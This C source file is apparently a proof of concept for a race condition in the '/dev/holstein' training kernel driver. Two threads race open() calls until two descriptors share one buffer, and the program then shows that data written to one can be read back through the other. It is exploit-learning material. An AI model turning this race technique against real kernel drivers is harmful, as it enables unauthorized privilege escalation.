#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int win = 0;

void *race(void *arg) {
  while (1) {
    while (!win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == 4) {
        win = 1;
      }
      if (win == 0 && fd != -1) {
        close(fd);
      }
    }
    if (write(3, "a", 1) != 1 || write(4, "A", 1) != 1) {
      close(3);
      close(4);
      win = 0;
    } else {
      break;
    }
  }
  return NULL;
}

int main() {
  pthread_t thread1, thread2;
  puts("[*] creating two threads");
  pthread_create(&thread1, NULL, race, NULL);
  pthread_create(&thread2, NULL, race, NULL);

  pthread_join(thread1, NULL);
  pthread_join(thread2, NULL);
  puts("[*] threads joined");

  char buf[0x400];
  int fd1 = 3, fd2 = 4;
  puts("[*] writting deadbeef to fd = 3");
  write(fd1, "deadbeef", 9);
  puts("[*] reading from fd = 4");
  read(fd2, buf, 9);
  printf("[*] buf content: %s\n", buf);

  return 0;
}